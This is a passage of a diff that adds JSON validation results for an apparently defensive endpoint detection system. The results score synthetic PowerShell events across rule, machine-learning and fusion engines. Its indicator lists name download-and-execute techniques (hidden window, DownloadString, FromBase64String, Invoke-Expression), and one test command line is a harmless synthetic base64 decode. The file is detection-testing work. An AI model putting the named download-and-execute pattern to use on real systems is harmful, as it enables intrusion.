+          "p97": 0.16416013202775295,
+          "p99": 0.23687126271753484
+        },
+        "pid": 992108,
+        "process_name": "powershell.exe",
+        "parent_process_name": "explorer.exe",
+        "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      },
+      "temporal": {
+        "state": "TEMPORAL_INFERENCE_COMPLETE",
+        "available": true,
+        "depth": 8,
+        "score": 100.0,
+        "severity": "HIGH",
+        "label": "HIGH_ANOMALY",
+        "should_alert": true,
+        "result_id": 3
+      },
+      "fusion": {
+        "rule_score": 100.0,
+        "statistical_score": 0.0,
+        "ai_consensus_score": 26.16,
+        "ai_consensus": {
+          "available": true,
+          "model_count": 2,
+          "isolation_forest_available": true,
+          "autoencoder_available": true,
+          "isolation_forest_score": 29.06,
+          "autoencoder_score": 23.26,
+          "average_score": 26.16,
+          "consensus_score": 26.16,
+          "consensus_label": "NORMAL",
+          "agreement": "VERY_HIGH",
+          "agreement_difference": 5.8,
+          "isolation_forest_active": false,
+          "autoencoder_active": false,
+          "isolation_forest_strong": false,
+          "autoencoder_strong": false,
+          "both_active": false,
+          "both_strong": false,
+          "disagreement": false,
+          "confidence": "MODERATE",
+          "reason": "Behavioral AI models do not jointly report a strong anomaly.",
+          "fusion_v3_category_score": 26.16
+        },
+        "active_signals": [
+          "rules",
+          "temporal_ai"
+        ],
+        "strong_signals": [
+          "rules",
+          "temporal_ai"
+        ],
+        "active_signal_count": 2,
+        "strong_signal_count": 2,
+        "weighted_score": 54.16,
+        "agreement_bonus": 0.0,
+        "strong_bonus": 0.0,
+        "ai_internal_bonus": 0.0,
+        "ai_disagreement_penalty": 0.0,
+        "fusion_score": 92.289,
+        "severity": "CRITICAL",
+        "suspicious": true,
+        "should_alert": true,
+        "critical_allowed": true,
+        "evidence_confidence": "VERY_HIGH",
+        "reasons": [
+          "RULE_EVIDENCE",
+          "TEMPORAL_AI_EVIDENCE",
+          "BEHAVIORAL_TEMPORAL_DISAGREEMENT",
+          "CRITICAL_MULTI_SOURCE_CORROBORATION"
+        ],
+        "behavior_indicators": [
+          "monitored_binary",
+          "command:-windowstyle hidden",
+          "command:downloadstring",
+          "command:frombase64string",
+          "command:invoke-expression",
+          "script_network_reference"
+        ],
+        "statistical_indicators": [],
+        "fusion_name": "process_threat_fusion_v3",
+        "fusion_version": "v3",
+        "primary_engine": "process_threat_fusion_v3",
+        "operating_mode": "PRODUCTION_PRIMARY",
+        "primary_decision": true,
+        "promoted_to_primary": true,
+        "temporal_ai_score": 100.0,
+        "active_categories": [
+          "rules",
+          "temporal_ai"
+        ],
+        "strong_categories": [
+          "rules",
+          "temporal_ai"
+        ],
+        "temporal_ai_available": true,
+        "ai_temporal_disagreement": true,
+        "ai_temporal_score_difference": 73.84,
+        "fusion_v3": {
+          "fusion_name": "sentinelx_process_threat_fusion",
+          "fusion_version": "v3",
+          "fusion_score": 92.289,
+          "severity": "CRITICAL",
+          "suspicious": true,
+          "should_alert": true,
+          "critical_allowed": true,
+          "critical_evidence_gate": true,
+          "evidence_confidence": "VERY_HIGH",
+          "available_category_count": 4,
+          "active_signal_count": 2,
+          "strong_signal_count": 2,
+          "available_categories": [
+            "rules",
+            "statistical",
+            "behavioral_ai",
+            "temporal_ai"
+          ],
+          "active_categories": [
+            "rules",
+            "temporal_ai"
+          ],
+          "strong_categories": [
+            "rules",
+            "temporal_ai"
+          ],
+          "scores": {
+            "rules": 100.0,
+            "statistical": 0.0,
+            "behavioral_ai_consensus": 26.16,
+            "temporal_ai": 100.0
+          },
+          "categories": {
+            "rules": {
+              "available": true,
+              "score": 100.0,
+              "active": true,
+              "strong": true
+            },
+            "statistical": {
+              "available": true,
+              "score": 0.0,
+              "active": false,
+              "strong": false
+            },
+            "behavioral_ai": {
+              "available": true,
+              "score": 26.16,
+              "active": false,
+              "strong": false
+            },
+            "temporal_ai": {
+              "available": true,
+              "score": 100.0,
+              "active": true,
+              "strong": true
+            }
+          },
+          "behavioral_ai_consensus": {
+            "available": true,
+            "model_count": 2,
+            "isolation_forest_available": true,
+            "autoencoder_available": true,
+            "isolation_forest_score": 29.06,
+            "autoencoder_score": 23.26,
+            "average_score": 26.16,
+            "consensus_score": 26.16,
+            "consensus_label": "NORMAL",
+            "agreement": "VERY_HIGH",
+            "agreement_difference": 5.8,
+            "isolation_forest_active": false,
+            "autoencoder_active": false,
+            "isolation_forest_strong": false,
+            "autoencoder_strong": false,
+            "both_active": false,
+            "both_strong": false,
+            "disagreement": false,
+            "confidence": "MODERATE",
+            "reason": "Behavioral AI models do not jointly report a strong anomaly."
+          },
+          "temporal_ai_available": true,
+          "ai_temporal_score_difference": 73.84,
+          "ai_temporal_disagreement": true,
+          "modifiers": {
+            "active_bonus": 4.0,
+            "strong_bonus": 5.0,
+            "rule_behavior_bonus": 0.0,
+            "rule_temporal_bonus": 3.0,
+            "behavioral_temporal_agreement_bonus": 0.0,
+            "disagreement_penalty": 8.0,
+            "single_source_cap": null,
+            "ai_only_evidence_cap_applied": false
+          },
+          "overall_weighted_score": 66.54,
+          "active_weighted_score": 100.0,
+          "reasons": [
+            "RULE_EVIDENCE",
+            "TEMPORAL_AI_EVIDENCE",
+            "BEHAVIORAL_TEMPORAL_DISAGREEMENT",
+            "CRITICAL_MULTI_SOURCE_CORROBORATION"
+          ],
+          "interpretation": "Fusion score combines rules, statistical behavior, dual behavioral AI consensus and temporal AI. It is a defensive risk score, not a probability of compromise.",
+          "result_id": 49,
+          "operating_mode": "PRODUCTION_PRIMARY",
+          "bridge_name": "sentinelx_fusion_v3_evidence_bridge",
+          "bridge_version": "v1",
+          "evidence_bridge_complete": true,
+          "fusion_v2_comparison": {
+            "available": true,
+            "fusion_v2_score": 75.0,
+            "fusion_v2_severity": "HIGH",
+            "fusion_v2_rule_score": 100.0,
+            "fusion_v2_statistical_score": 0.0,
+            "fusion_v2_ai_consensus_score": 26.16,
+            "score_delta_v3_minus_v2": 17.289
+          }
+        },
+        "fusion_v2_reference": {
+          "rule_score": 100.0,
+          "statistical_score": 0.0,
+          "ai_consensus_score": 26.16,
+          "ai_consensus": {
+            "available": true,
+            "model_count": 2,
+            "isolation_forest_available": true,
+            "autoencoder_available": true,
+            "isolation_forest_score": 29.06,
+            "autoencoder_score": 23.26,
+            "average_score": 26.16,
+            "consensus_score": 26.16,
+            "consensus_label": "NORMAL",
+            "agreement": "VERY_HIGH",
+            "agreement_difference": 5.8,
+            "isolation_forest_active": false,
+            "autoencoder_active": false,
+            "isolation_forest_strong": false,
+            "autoencoder_strong": false,
+            "both_active": false,
+            "both_strong": false,
+            "disagreement": false,
+            "confidence": "MODERATE",
+            "reason": "Behavioral AI models do not jointly report a strong anomaly.",
+            "fusion_v3_category_score": 26.16
+          },
+          "active_signals": {
+            "rules": true,
+            "statistical": false,
+            "behavioral_ai_consensus": false
+          },
+          "strong_signals": {
+            "rules": true,
+            "statistical": false,
+            "behavioral_ai_consensus": false
+          },
+          "active_signal_count": 1,
+          "strong_signal_count": 1,
+          "weighted_score": 54.16,
+          "agreement_bonus": 0.0,
+          "strong_bonus": 0.0,
+          "ai_internal_bonus": 0.0,
+          "ai_disagreement_penalty": 0.0,
+          "fusion_score": 75.0,
+          "severity": "HIGH",
+          "suspicious": true,
+          "should_alert": true,
+          "critical_allowed": false,
+          "evidence_confidence": "LOW",
+          "reasons": [
+            "Rule evidence score=100.00"
+          ],
+          "behavior_indicators": [
+            "monitored_binary",
+            "command:-windowstyle hidden",
+            "command:downloadstring",
+            "command:frombase64string",
+            "command:invoke-expression",
+            "script_network_reference"
+          ],
+          "statistical_indicators": []
+        },
+        "rollback_engine": "process_threat_fusion_v2",
+        "rollback_available": true,
+        "fusion_v2_comparison": {
+          "available": true,
+          "fusion_v2_score": 75.0,
+          "fusion_v2_severity": "HIGH",
+          "fusion_v2_rule_score": 100.0,
+          "fusion_v2_statistical_score": 0.0,
+          "fusion_v2_ai_consensus_score": 26.16,
+          "score_delta_v3_minus_v2": 17.289
+        }
+      },
+      "feature_record_id": 49,
+      "detections": [
+        {
+          "id": 11,
+          "event_id": "cdcbdc0a-fa66-4a0b-92cf-4f45c4f96424",
+          "engine": "process_threat_fusion_v3",
+          "detected": 1,
+          "threat_type": "POWERSHELL_DOWNLOAD_EXECUTION",
+          "confidence": null,
+          "risk_score": 92.0,
+          "severity": "CRITICAL",
+          "reason": "[\"RULE_EVIDENCE\", \"TEMPORAL_AI_EVIDENCE\", \"BEHAVIORAL_TEMPORAL_DISAGREEMENT\", \"CRITICAL_MULTI_SOURCE_CORROBORATION\"]",
+          "created_at": "2026-10-05 19:10:52"
+        }
+      ],
+      "stored_detection_count": 1,
+      "live_counter_before": 0,
+      "live_counter_after": 0,
+      "live_isolation_ok": true,
+      "sequence_steps": [
+        {
+          "scenario_id": "P1-08-S01",
+          "rule_score": 5,
+          "statistical_score": 0,
+          "if_score": 27.12,
+          "ae_score": 44.72,
+          "temporal_state": "COLLECTING_HISTORY",
+          "temporal_score": null,
+          "fusion_score": 14.3067,
+          "should_alert": false,
+          "event_id": "1170a9e7-be19-46d9-9a67-8c4d806e23bd"
+        },
+        {
+          "scenario_id": "P1-08-S02",
+          "rule_score": 5,
+          "statistical_score": 0,
+          "if_score": 26.43,
+          "ae_score": 42.34,
+          "temporal_state": "COLLECTING_HISTORY",
+          "temporal_score": null,
+          "fusion_score": 13.7967,
+          "should_alert": false,
+          "event_id": "0c527e58-0df3-458f-be09-6167dfa6f29f"
+        },
+        {
+          "scenario_id": "P1-08-S03",
+          "rule_score": 5,
+          "statistical_score": 0,
+          "if_score": 26.49,
+          "ae_score": 40.27,
+          "temporal_state": "COLLECTING_HISTORY",
+          "temporal_score": null,
+          "fusion_score": 13.46,
+          "should_alert": false,
+          "event_id": "5d30a7e0-8952-4cb1-98d5-900d528846cd"
+        },
+        {
+          "scenario_id": "P1-08-S04",
+          "rule_score": 5,
+          "statistical_score": 0,
+          "if_score": 26.43,
+          "ae_score": 35.21,
+          "temporal_state": "COLLECTING_HISTORY",
+          "temporal_score": null,
+          "fusion_score": 12.6067,
+          "should_alert": false,
+          "event_id": "05898107-25de-481b-9577-bf75c45ce568"
+        },
+        {
+          "scenario_id": "P1-08-S05",
+          "rule_score": 30,
+          "statistical_score": 0,
+          "if_score": 27.23,
+          "ae_score": 29.75,
+          "temporal_state": "COLLECTING_HISTORY",
+          "temporal_score": null,
+          "fusion_score": 23.4967,
+          "should_alert": false,
+          "event_id": "9f58e227-c907-49b6-83a2-3bef120a3e3f"
+        },
+        {
+          "scenario_id": "P1-08-S06",
+          "rule_score": 35,
+          "statistical_score": 0,
+          "if_score": 26.48,
+          "ae_score": 37.0,
+          "temporal_state": "COLLECTING_HISTORY",
+          "temporal_score": null,
+          "fusion_score": 32.1697,
+          "should_alert": false,
+          "event_id": "a2a2fa64-5614-4232-9c46-8fbdcc5f4dff"
+        },
+        {
+          "scenario_id": "P1-08-S07",
+          "rule_score": 50,
+          "statistical_score": 0,
+          "if_score": 26.54,
+          "ae_score": 33.72,
+          "temporal_state": "COLLECTING_HISTORY",
+          "temporal_score": null,
+          "fusion_score": 44.1818,
+          "should_alert": false,
+          "event_id": "af0d1c6d-048b-44ed-a3bd-4099e7ce81db"
+        },
+        {
+          "scenario_id": "P1-08-S08",
+          "rule_score": 100,
+          "statistical_score": 0,
+          "if_score": 29.06,
+          "ae_score": 23.26,
+          "temporal_state": "TEMPORAL_INFERENCE_COMPLETE",
+          "temporal_score": 100.0,
+          "fusion_score": 92.289,
+          "should_alert": true,
+          "event_id": "cdcbdc0a-fa66-4a0b-92cf-4f45c4f96424"
+        }
+      ],
+      "failures": [],
+      "passed": true
+    },
+    {
+      "scenario_id": "P1-09",
+      "scenario_name": "Duplicate detection persistence",
+      "event_id": "cb0050fe-22d1-4755-9e7e-3088a14b2660",
+      "process": {
+        "pid": 992109,
+        "ppid": 991000,
+        "name": "powershell.exe",
+        "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "cmdline": "powershell.exe -WindowStyle Hidden -Command \"[Convert]::FromBase64String('U1lOVEhFVElD') | Out-Null\"",
+        "username": "sentinel-validation",
+        "create_time": 1791227447.982189,
+        "parent_name": "winword.exe",
+        "cpu_percent": 0.5,
+        "memory_percent": 0.2,
+        "rss_mb": 45.0,
+        "num_threads": 8,
+        "num_handles": 120
+      },
+      "rule": {
+        "behavior_score": 80,
+        "severity": "CRITICAL",
+        "suspicious": true,
+        "reasons": [
+          "Security-relevant Windows utility observed",
+          "Command-line indicator observed: -windowstyle hidden",
+          "Command-line indicator observed: frombase64string",
+          "Document application launched a scripting or command interpreter"
+        ],
+        "indicators": [
+          "monitored_binary",
+          "command:-windowstyle hidden",
+          "command:frombase64string",
+          "document_to_script"
+        ],
+        "process_name": "powershell.exe",
+        "parent_name": "winword.exe"
+      },
+      "statistical": {
+        "process_name": "powershell.exe",
+        "anomaly_score": 0,
+        "severity": "INFO",
+        "anomalous": false,
+        "cpu_percent": 0.5,
+        "memory_percent": 0.2,
+        "num_threads": 8.0,
+        "cpu_z_score": 0.0,
+        "memory_z_score": 0.0,
+        "thread_z_score": 0.0,
+        "indicators": [],
+        "reasons": [],
+        "history_samples": 16,
+        "timestamp": 1791227452.982189
+      },
+      "isolation_forest": {
+        "available": true,
+        "model_name": "sentinelx_process_isolation_forest",
+        "model_version": "v1",
+        "schema_version": "process_behavior_v1",
+        "feature_count": 19,
+        "decision_score": -0.00468422,
+        "raw_score": -0.50468422,
+        "model_prediction": -1,
+        "model_outlier": true,
+        "anomaly_confidence": 44.38,
+        "anomaly_label": "UNUSUAL",
+        "severity": "LOW",
+        "should_alert": false,
+        "feature_deviations": [
+          {
+            "feature": "parent_is_office_app",
+            "value": 1.0,
+            "baseline_mean": 0.006,
+            "baseline_std": 0.0775,
+            "deviation_std": 12.8258
+          },
+          {
+            "feature": "is_script_interpreter",
+            "value": 1.0,
+            "baseline_mean": 0.0281,
+            "baseline_std": 0.1653,
+            "deviation_std": 5.8789
+          },
+          {
+            "feature": "recent_event_count",
+            "value": 1.0,
+            "baseline_mean": 7.0402,
+            "baseline_std": 9.8306,
+            "deviation_std": 0.6144
+          },
+          {
+            "feature": "num_handles",
+            "value": 120.0,
+            "baseline_mean": 464.0356,
+            "baseline_std": 579.8446,
+            "deviation_std": 0.5933
+          },
+          {
+            "feature": "is_system_path",
+            "value": 1.0,
+            "baseline_mean": 0.8592,
+            "baseline_std": 0.3478,
+            "deviation_std": 0.4049
+          }
+        ],
+        "pid": 992109,
+        "process_name": "powershell.exe",
+        "parent_process_name": "winword.exe",
+        "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      },
+      "autoencoder": {
+        "available": true,
+        "model_name": "sentinelx_process_autoencoder",
+        "model_version": "v2",
+        "hidden_activation": "tanh",
+        "schema_version": "process_behavior_v1",
+        "feature_count": 19,
+        "reconstruction_error": 0.1189811535,
+        "reconstruction_region": "UPPER_5_PERCENT",
+        "anomaly_confidence": 55.23,
+        "anomaly_label": "UNUSUAL",
+        "severity": "LOW",
+        "candidate_alert": false,
+        "embedding_dimension": 4,
+        "behavior_embedding": [
+          0.96138715,
+          0.72823451,
+          0.95838591,
+          0.40597366
+        ],
+        "feature_reconstruction_errors": [
+          {
+            "feature": "parent_is_office_app",
+            "actual_value": 1.0,
+            "reconstructed_value": -0.003499,
+            "scaled_squared_error": 1.00700949,
+            "absolute_original_difference": 1.003499
+          },
+          {
+            "feature": "num_handles",
+            "actual_value": 120.0,
+            "reconstructed_value": 554.19498,
+            "scaled_squared_error": 0.46093507,
+            "absolute_original_difference": 434.19498
+          },
+          {
+            "feature": "command_arg_count",
+            "actual_value": 7.0,
+            "reconstructed_value": 11.606506,
+            "scaled_squared_error": 0.29330075,
+            "absolute_original_difference": 4.606506
+          },
+          {
+            "feature": "recent_event_count",
+            "actual_value": 1.0,
+            "reconstructed_value": 6.033638,
+            "scaled_squared_error": 0.22821351,
+            "absolute_original_difference": 5.033638
+          },
+          {
+            "feature": "command_line_length",
+            "actual_value": 100.0,
+            "reconstructed_value": 271.253605,
+            "scaled_squared_error": 0.1684541,
+            "absolute_original_difference": 171.253605
+          }
+        ],
+        "calibration": {
+          "p50": 0.01421417566516108,
+          "p90": 0.08318183402218673,
+          "p95": 0.1278470974946212,
+          "p97": 0.16416013202775295,
+          "p99": 0.23687126271753484
+        },
+        "pid": 992109,
+        "process_name": "powershell.exe",
+        "parent_process_name": "winword.exe",
+        "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      },
+      "temporal": {
+        "state": "COLLECTING_HISTORY",
+        "available": true,
+        "depth": 1,
+        "score": null,
+        "severity": null,
+        "label": null,
+        "should_alert": null,
+        "result_id": null
+      },
+      "fusion": {
+        "rule_score": 80.0,
+        "statistical_score": 0.0,
+        "ai_consensus_score": 49.8,
+        "ai_consensus": {
+          "available": true,
+          "model_count": 2,
+          "isolation_forest_available": true,
+          "autoencoder_available": true,
+          "isolation_forest_score": 44.38,
+          "autoencoder_score": 55.23,
+          "average_score": 49.8,
+          "consensus_score": 49.8,
+          "consensus_label": "UNUSUAL",
+          "agreement": "HIGH",
+          "agreement_difference": 10.85,
+          "isolation_forest_active": false,
+          "autoencoder_active": false,
+          "isolation_forest_strong": false,
+          "autoencoder_strong": false,
+          "both_active": false,
+          "both_strong": false,
+          "disagreement": false,
+          "confidence": "MODERATE",
+          "reason": "Behavioral AI models do not jointly report a strong anomaly.",
+          "fusion_v3_category_score": 49.8
+        },
+        "active_signals": [
+          "rules"
+        ],
+        "strong_signals": [
+          "rules"
+        ],
+        "active_signal_count": 1,
+        "strong_signal_count": 1,
+        "weighted_score": 53.43,
+        "agreement_bonus": 0.0,
+        "strong_bonus": 0.0,
+        "ai_internal_bonus": 0.0,
+        "ai_disagreement_penalty": 0.0,
+        "fusion_score": 70.8767,
+        "severity": "HIGH",
+        "suspicious": true,
+        "should_alert": true,
+        "critical_allowed": false,
+        "evidence_confidence": "LIMITED",
+        "reasons": [
+          "RULE_EVIDENCE"
+        ],
+        "behavior_indicators": [
+          "monitored_binary",
+          "command:-windowstyle hidden",
+          "command:frombase64string",
+          "document_to_script"
+        ],
+        "statistical_indicators": [],
+        "fusion_name": "process_threat_fusion_v3",
+        "fusion_version": "v3",
+        "primary_engine": "process_threat_fusion_v3",
+        "operating_mode": "PRODUCTION_PRIMARY",
+        "primary_decision": true,
+        "promoted_to_primary": true,
+        "temporal_ai_score": 0.0,
+        "active_categories": [
+          "rules"
+        ],
+        "strong_categories": [
+          "rules"
+        ],
+        "temporal_ai_available": false,
+        "ai_temporal_disagreement": false,
+        "ai_temporal_score_difference": null,
+        "fusion_v3": {
+          "fusion_name": "sentinelx_process_threat_fusion",
+          "fusion_version": "v3",
+          "fusion_score": 70.8767,
+          "severity": "HIGH",
+          "suspicious": true,
+          "should_alert": true,
+          "critical_allowed": false,
+          "critical_evidence_gate": false,
+          "evidence_confidence": "LIMITED",
+          "available_category_count": 3,
+          "active_signal_count": 1,
+          "strong_signal_count": 1,
+          "available_categories": [
+            "rules",
+            "statistical",
+            "behavioral_ai"
+          ],
+          "active_categories": [
+            "rules"
+          ],
+          "strong_categories": [
+            "rules"
+          ],
+          "scores": {
+            "rules": 80.0,
+            "statistical": 0.0,
+            "behavioral_ai_consensus": 49.8,
+            "temporal_ai": 0.0
+          },
+          "categories": {
+            "rules": {
+              "available": true,
+              "score": 80.0,
+              "active": true,
+              "strong": true
+            },
+            "statistical": {
+              "available": true,
+              "score": 0.0,
+              "active": false,
+              "strong": false
+            },
+            "behavioral_ai": {
+              "available": true,
+              "score": 49.8,
+              "active": false,
+              "strong": false
+            },
+            "temporal_ai": {
+              "available": false,
+              "score": 0.0,
+              "active": false,
+              "strong": false
+            }
+          },
+          "behavioral_ai_consensus": {
+            "available": true,
+            "model_count": 2,
+            "isolation_forest_available": true,
+            "autoencoder_available": true,
+            "isolation_forest_score": 44.38,
+            "autoencoder_score": 55.23,
+            "average_score": 49.8,
+            "consensus_score": 49.8,
+            "consensus_label": "UNUSUAL",
+            "agreement": "HIGH",
+            "agreement_difference": 10.85,
+            "isolation_forest_active": false,
+            "autoencoder_active": false,
+            "isolation_forest_strong": false,
+            "autoencoder_strong": false,
+            "both_active": false,
+            "both_strong": false,
+            "disagreement": false,
+            "confidence": "MODERATE",
+            "reason": "Behavioral AI models do not jointly report a strong anomaly."
+          },
+          "temporal_ai_available": false,
+          "ai_temporal_score_difference": null,
+          "ai_temporal_disagreement": false,
+          "modifiers": {
+            "active_bonus": 0.0,
+            "strong_bonus": 0.0,
+            "rule_behavior_bonus": 0.0,
+            "rule_temporal_bonus": 0.0,
+            "behavioral_temporal_agreement_bonus": 0.0,
+            "disagreement_penalty": 0.0,
+            "single_source_cap": 79.0,
+            "ai_only_evidence_cap_applied": false
+          },
+          "overall_weighted_score": 53.9333,
+          "active_weighted_score": 80.0,
+          "reasons": [
+            "RULE_EVIDENCE"
+          ],
+          "interpretation": "Fusion score combines rules, statistical behavior, dual behavioral AI consensus and temporal AI. It is a defensive risk score, not a probability of compromise.",
+          "result_id": 50,
+          "operating_mode": "PRODUCTION_PRIMARY",
+          "bridge_name": "sentinelx_fusion_v3_evidence_bridge",
+          "bridge_version": "v1",
+          "evidence_bridge_complete": true,
+          "fusion_v2_comparison": {
+            "available": true,
+            "fusion_v2_score": 60.0,
+            "fusion_v2_severity": "HIGH",
+            "fusion_v2_rule_score": 80.0,
+            "fusion_v2_statistical_score": 0.0,
+            "fusion_v2_ai_consensus_score": 49.8,
+            "score_delta_v3_minus_v2": 10.8767
+          }
+        },
+        "fusion_v2_reference": {
+          "rule_score": 80.0,
+          "statistical_score": 0.0,
+          "ai_consensus_score": 49.8,
+          "ai_consensus": {
+            "available": true,
+            "model_count": 2,
+            "isolation_forest_available": true,
+            "autoencoder_available": true,
+            "isolation_forest_score": 44.38,
+            "autoencoder_score": 55.23,
+            "average_score": 49.8,
+            "consensus_score": 49.8,
+            "consensus_label": "UNUSUAL",
+            "agreement": "HIGH",
+            "agreement_difference": 10.85,
+            "isolation_forest_active": false,
+            "autoencoder_active": false,
+            "isolation_forest_strong": false,
+            "autoencoder_strong": false,
+            "both_active": false,
+            "both_strong": false,
+            "disagreement": false,
+            "confidence": "MODERATE",
+            "reason": "Behavioral AI models do not jointly report a strong anomaly.",
+            "fusion_v3_category_score": 49.8
+          },
+          "active_signals": {
+            "rules": true,
+            "statistical": false,
+            "behavioral_ai_consensus": false
+          },
+          "strong_signals": {
+            "rules": true,
+            "statistical": false,
+            "behavioral_ai_consensus": false
+          },
+          "active_signal_count": 1,
+          "strong_signal_count": 1,
+          "weighted_score": 53.43,
+          "agreement_bonus": 0.0,
+          "strong_bonus": 0.0,
+          "ai_internal_bonus": 0.0,
+          "ai_disagreement_penalty": 0.0,
+          "fusion_score": 60.0,
+          "severity": "HIGH",
+          "suspicious": true,
+          "should_alert": true,
+          "critical_allowed": false,
+          "evidence_confidence": "LOW",
+          "reasons": [
+            "Rule evidence score=80.00"
+          ],
+          "behavior_indicators": [
+            "monitored_binary",
+            "command:-windowstyle hidden",
+            "command:frombase64string",
+            "document_to_script"
+          ],
+          "statistical_indicators": []
+        },
+        "rollback_engine": "process_threat_fusion_v2",
+        "rollback_available": true,
+        "fusion_v2_comparison": {
+          "available": true,
+          "fusion_v2_score": 60.0,
+          "fusion_v2_severity": "HIGH",
+          "fusion_v2_rule_score": 80.0,
+          "fusion_v2_statistical_score": 0.0,
+          "fusion_v2_ai_consensus_score": 49.8,
+          "score_delta_v3_minus_v2": 10.8767
+        }
+      },
+      "feature_record_id": 50,
+      "detections": [
+        {
+          "id": 12,
+          "event_id": "cb0050fe-22d1-4755-9e7e-3088a14b2660",
+          "engine": "process_threat_fusion_v3",
+          "detected": 1,
+          "threat_type": "DOCUMENT_TO_POWERSHELL",
+          "confidence": null,
+          "risk_score": 71.0,
+          "severity": "HIGH",
+          "reason": "[\"RULE_EVIDENCE\"]",
+          "created_at": "2026-10-05 19:10:53"
+        }
+      ],
+      "stored_detection_count": 1,
+      "live_counter_before": 0,
+      "live_counter_after": 0,
+      "live_isolation_ok": true,
+      "failures": [],
+      "passed": true
+    },
+    {
+      "scenario_id": "P1-10",
+      "scenario_name": "Incomplete PowerShell telemetry",
+      "event_id": "172b5b39-648a-4d47-a4e8-9171f71566dc",
+      "process": {
+        "pid": 992110,
+        "ppid": 991000,
+        "name": "powershell.exe",
+        "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "cmdline": "",
+        "username": "sentinel-validation",
+        "create_time": 1791227445.3701909,
+        "parent_name": null,
+        "cpu_percent": 0.5,
+        "memory_percent": 0.2,
+        "rss_mb": 45.0,
+        "num_threads": 8,
+        "num_handles": 120
+      },
+      "rule": {
+        "behavior_score": 5,
+        "severity": "INFO",
+        "suspicious": false,
+        "reasons": [
+          "Security-relevant Windows utility observed"
+        ],
+        "indicators": [
+          "monitored_binary"
+        ],
+        "process_name": "powershell.exe",
+        "parent_name": ""
+      },
+      "statistical": {
+        "process_name": "powershell.exe",
+        "anomaly_score": 0,
+        "severity": "INFO",
+        "anomalous": false,
+        "cpu_percent": 0.5,
+        "memory_percent": 0.2,
+        "num_threads": 8.0,
+        "cpu_z_score": 0.0,
+        "memory_z_score": 0.0,
+        "thread_z_score": 0.0,
+        "indicators": [],
+        "reasons": [],
+        "history_samples": 17,
+        "timestamp": 1791227453.1340384
+      },
+      "isolation_forest": {
+        "available": true,
+        "model_name": "sentinelx_process_isolation_forest",
+        "model_version": "v1",
+        "schema_version": "process_behavior_v1",
+        "feature_count": 19,
+        "decision_score": 0.05514684,
+        "raw_score": -0.44485316,
+        "model_prediction": 1,
+        "model_outlier": false,
+        "anomaly_confidence": 26.24,
+        "anomaly_label": "NORMAL",
+        "severity": "INFO",
+        "should_alert": false,
+        "feature_deviations": [
+          {
+            "feature": "is_script_interpreter",
+            "value": 1.0,
+            "baseline_mean": 0.0281,
+            "baseline_std": 0.1653,
+            "deviation_std": 5.8789
+          },
+          {
+            "feature": "recent_event_count",
+            "value": 1.0,
+            "baseline_mean": 7.0402,
+            "baseline_std": 9.8306,
+            "deviation_std": 0.6144
+          },
+          {
+            "feature": "num_handles",
+            "value": 120.0,
+            "baseline_mean": 464.0356,
+            "baseline_std": 579.8446,
+            "deviation_std": 0.5933
+          },
+          {
+            "feature": "command_arg_count",
+            "value": 0.0,
+            "baseline_mean": 4.2561,
+            "baseline_std": 7.9446,
+            "deviation_std": 0.5357
+          },
+          {
+            "feature": "command_line_length",
+            "value": 0.0,
+            "baseline_mean": 170.0867,
+            "baseline_std": 386.8577,
+            "deviation_std": 0.4397
+          }
+        ],
+        "pid": 992110,
+        "process_name": "powershell.exe",
+        "parent_process_name": null,
+        "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      },
+      "autoencoder": {
+        "available": true,
+        "model_name": "sentinelx_process_autoencoder",
+        "model_version": "v2",
+        "hidden_activation": "tanh",
+        "schema_version": "process_behavior_v1",
+        "feature_count": 19,
+        "reconstruction_error": 0.1472114443,
+        "reconstruction_region": "UPPER_3_PERCENT",
+        "anomaly_confidence": 70.13,
+        "anomaly_label": "SUSPICIOUS",
+        "severity": "MEDIUM",
+        "candidate_alert": false,
+        "embedding_dimension": 4,
+        "behavior_embedding": [
+          0.95904031,
+          0.74889238,
+          0.95181448,
+          0.41667099
+        ],
+        "feature_reconstruction_errors": [
+          {
+            "feature": "command_arg_count",
+            "actual_value": 0.0,
+            "reconstructed_value": 10.316725,
+            "scaled_squared_error": 1.47113869,
+            "absolute_original_difference": 10.316725
+          },
+          {
+            "feature": "num_handles",
+            "actual_value": 120.0,
+            "reconstructed_value": 637.211153,
+            "scaled_squared_error": 0.65404242,
+            "absolute_original_difference": 517.211153
+          },
+          {
+            "feature": "command_line_length",
+            "actual_value": 0.0,
+            "reconstructed_value": 209.777879,
+            "scaled_squared_error": 0.25276767,
+            "absolute_original_difference": 209.777879
+          },
+          {
+            "feature": "recent_event_count",
+            "actual_value": 1.0,
+            "reconstructed_value": 5.757124,
+            "scaled_squared_error": 0.20382919,
+            "absolute_original_difference": 4.757124
+          },
+          {
+            "feature": "num_threads",
+            "actual_value": 8.0,
+            "reconstructed_value": 15.021968,
+            "scaled_squared_error": 0.09027605,
+            "absolute_original_difference": 7.021968
+          }
+        ],
+        "calibration": {
+          "p50": 0.01421417566516108,
+          "p90": 0.08318183402218673,
+          "p95": 0.1278470974946212,
+          "p97": 0.16416013202775295,
+          "p99": 0.23687126271753484
+        },
+        "pid": 992110,
+        "process_name": "powershell.exe",
+        "parent_process_name": null,
+        "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      },
+      "temporal": {
+        "state": "COLLECTING_HISTORY",
+        "available": true,
+        "depth": 1,
+        "score": null,
+        "severity": null,
+        "label": null,
+        "should_alert": null,
+        "result_id": null
+      },
+      "fusion": {
+        "rule_score": 5.0,
+        "statistical_score": 0.0,
+        "ai_consensus_score": 36.81,
+        "ai_consensus": {
+          "available": true,
+          "model_count": 2,
+          "isolation_forest_available": true,
+          "autoencoder_available": true,
+          "isolation_forest_score": 26.24,
+          "autoencoder_score": 70.13,
+          "average_score": 48.18,
+          "consensus_score": 36.81,
+          "consensus_label": "NORMAL",
+          "agreement": "LOW",
+          "agreement_difference": 43.89,
+          "isolation_forest_active": false,
+          "autoencoder_active": true,
+          "isolation_forest_strong": false,
+          "autoencoder_strong": false,
+          "both_active": false,
+          "both_strong": false,
+          "disagreement": true,
+          "confidence": "LOW",
